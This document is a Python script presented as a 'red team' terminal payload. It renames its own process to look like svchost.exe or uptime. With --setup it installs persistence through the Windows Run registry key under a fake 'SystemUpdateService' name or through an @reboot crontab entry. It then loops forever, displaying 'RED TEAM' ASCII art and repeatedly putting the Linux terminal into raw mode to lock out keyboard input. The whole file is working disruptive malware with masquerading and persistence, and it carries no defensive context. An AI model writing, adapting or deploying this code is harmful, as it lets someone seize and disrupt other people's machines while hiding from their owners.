#!/usr/bin/env python3
# redteam_terminal.py - Terminal-only red team domination
# Giant ASCII "RED TEAM" + keyboard freeze + persistence
import os
import sys
import time
import subprocess
import platform
SCRIPT = os.path.abspath(__file__)
PID_FILE = os.path.expanduser("~/.rt_pid")
DELAY_FILE = os.path.expanduser("~/.rt_delay")
DEFAULT_DELAY = 60000 # 60 seconds of frozen keyboard
def get_delay():
    try:
        with open(DELAY_FILE) as f:
            return max(10000, int(f.read().strip()))
    except:
        return DEFAULT_DELAY
def hide_process():
    name = "svchost.exe" if os.name == "nt" else "uptime"
    try:
        import ctypes
        if platform.system() == "Linux":
            ctypes.CDLL("libc.so.6").prctl(15, name.encode() + b"\0", 0, 0, 0)
        elif os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(name)
    except: pass
def install_persistence():
    if os.name == "nt": # Windows
        try:
            import winreg as reg
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            reg.SetValueEx(key, "SystemUpdateService", 0, reg.REG_SZ, f'"{pythonw}" "{SCRIPT}"')
            reg.CloseKey(key)
        except: pass
    else: # Linux
        line = f"@reboot python3 \"{SCRIPT}\"\n"
        try:
            cur = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
            if line not in cur:
                subprocess.run("crontab -", shell=True, input=(cur + line).encode())
        except: pass
# Giant ASCII art
RED_TEAM = """
\033[91m
██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗ ███╗
██╔══██╗██╔════╝██╔══██╗ ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝█████╗ ██║ ██║ ██║ █████╗ ███████║██╔████╔██║
██╔══██╗██╔══╝ ██║ ██║ ██║ ██╔══╝ ██╔══██║██║╚██╔╝██║
██║ ██║███████╗██████╔╝ ██║ ███████╗██║ ██║██║ ╚═╝ ██║
╚═╝ ╚═╝╚══════╝╚═════╝ ╚═╝ ╚══════╝╚═╝ ╚═╝╚═╝ ╚═╝
\033[0m
"""
def terminal_domination():
    hide_process()
    # Kill old instance
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE) as f:
                os.kill(int(f.read().strip()), 9)
        except: pass
    # Save PID
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))
    # Freeze keyboard on Linux (Windows gets visual freeze only)
    if platform.system() == "Linux":
        import termios, tty
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
    try:
        while True:
            os.system("clear" if os.name != "nt" else "cls")
            print(RED_TEAM.center(120))
            if platform.system() == "Linux":
                tty.setraw(fd)
                time.sleep(get_delay() / 1000)
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
            else:
                time.sleep(get_delay() / 1000)
    except KeyboardInterrupt:
        pass
    finally:
        if platform.system() == "Linux":
            try:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
            except:
                pass
# ——————— MAIN ——————
if __name__ == "__main__":
    hide_process()
    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        install_persistence()
        print("[+] Red Team terminal payload installed permanently")
        sys.exit(0)
    terminal_domination()
